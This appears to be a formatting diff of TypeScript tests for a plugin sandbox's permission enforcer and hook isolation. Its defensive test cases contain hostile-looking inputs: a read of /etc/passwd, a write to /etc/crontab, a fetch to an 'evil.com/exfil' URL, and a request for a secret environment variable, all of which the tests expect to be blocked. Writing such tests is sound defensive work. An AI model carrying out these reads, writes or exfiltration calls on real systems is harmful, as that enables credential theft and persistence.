@@ -320,12 +320,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       filesystem: { read: [`${tempDir}/**`], write: [] },
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     const content = await ctx.readFile(testFile);
     assert.equal(content, 'hello');
   });
@@ -334,12 +329,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       filesystem: { read: ['/tmp/allowed/**'], write: [] },
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     const content = await ctx.readFile('/etc/passwd');
     assert.equal(content, null);
   });
@@ -348,12 +338,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       filesystem: { read: [], write: [`${tempDir}/**`] },
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     const outFile = path.join(tempDir, 'out.txt');
     const success = await ctx.writeFile(outFile, 'written');
     assert.equal(success, true);
@@ -364,12 +349,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       filesystem: { read: [], write: [`${tempDir}/**`] },
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     const success = await ctx.writeFile('/etc/crontab', 'evil');
     assert.equal(success, false);
   });
@@ -378,12 +358,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       network: { allowedDomains: ['example.com'], allowedPorts: [443] },
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     // We can't actually fetch in tests, but we can verify the permission
     // check passes (the fetch itself will fail with a network error, not null)
     // The key assertion: the enforcer allowed the domain
@@ -395,12 +370,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       network: { allowedDomains: ['safe.com'], allowedPorts: [443] },
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     const result = await ctx.fetch('https://evil.com/exfil');
     assert.equal(result, null);
   });
@@ -410,12 +380,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       env: ['PLUGIN_TEST_VAR'],
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     assert.equal(ctx.getEnvVar('PLUGIN_TEST_VAR'), 'test-value');
     delete process.env.PLUGIN_TEST_VAR;
   });
@@ -425,12 +390,7 @@ describe('PluginSandboxContext', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test', {
       env: ['PUBLIC_VAR'],
     });
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     assert.equal(ctx.getEnvVar('SUPER_SECRET'), undefined);
     delete process.env.SUPER_SECRET;
   });
@@ -438,12 +398,7 @@ describe('PluginSandboxContext', () => {
   it('getConfig returns a copy (not reference)', () => {
     const config = { key: 'value', nested: { a: 1 } };
     const enforcer = new PluginPermissionEnforcer('sandbox-test');
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      config,
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, config, () => {});
     const returned = ctx.getConfig();
     assert.equal(returned.key, 'value');
     // Mutating returned config should not affect original
@@ -456,12 +411,9 @@ describe('PluginSandboxContext', () => {
       hooks: ['beforeToolCall'],
     });
     let registered = '';
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      (hookName: string) => { registered = hookName; },
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, (hookName: string) => {
+      registered = hookName;
+    });
 
     // Allowed hook
     const ok = ctx.registerHook('beforeToolCall', () => null);
@@ -477,12 +429,7 @@ describe('PluginSandboxContext', () => {
 
   it('log method works without permissions', () => {
     const enforcer = new PluginPermissionEnforcer('sandbox-test');
-    const ctx = createPluginSandboxContext(
-      'sandbox-test',
-      enforcer,
-      {},
-      () => {},
-    );
+    const ctx = createPluginSandboxContext('sandbox-test', enforcer, {}, () => {});
     // Should not throw
     ctx.log('info', 'test message', { foo: 'bar' });
     ctx.log('error', 'error message', { code: 500 });
@@ -514,8 +461,11 @@ describe('HookManager sandbox isolation (GAP-1 fix)', () => {
     });
 
     // The raw hookManager should NOT be present
-    assert.equal(receivedCtx.hookManager, undefined,
-      'Raw hookManager must NOT be passed to sandboxed plugins');
+    assert.equal(
+      receivedCtx.hookManager,
+      undefined,
+      'Raw hookManager must NOT be passed to sandboxed plugins',
+    );
     // Sandbox methods should be present
     assert.equal(typeof receivedCtx.registerHook, 'function');
     assert.equal(typeof receivedCtx.readFile, 'function');
@@ -576,8 +526,11 @@ describe('HookManager updateConfig sandbox (GAP-2 fix)', () => {
 
     // Second load (updateConfig): also no hookManager
     assert.equal(loadCount, 2);
-    assert.equal(receivedCtx.hookManager, undefined,
-      'updateConfig must NOT pass raw hookManager to sandboxed plugins');
+    assert.equal(
+      receivedCtx.hookManager,
+      undefined,
+      'updateConfig must NOT pass raw hookManager to sandboxed plugins',
+    );
   });
 });
 
@@ -619,7 +572,6 @@ describe('HookManager withTimeout per-plugin limit (GAP-3 fix)', () => {
     const elapsed = Date.now() - start;
 
     // Should timeout around 50ms, not 5000ms
-    assert.ok(elapsed < 500,
-      `Hook should timeout near 50ms, took ${elapsed}ms`);
+    assert.ok(elapsed < 500, `Hook should timeout near 50ms, took ${elapsed}ms`);
   });
 });
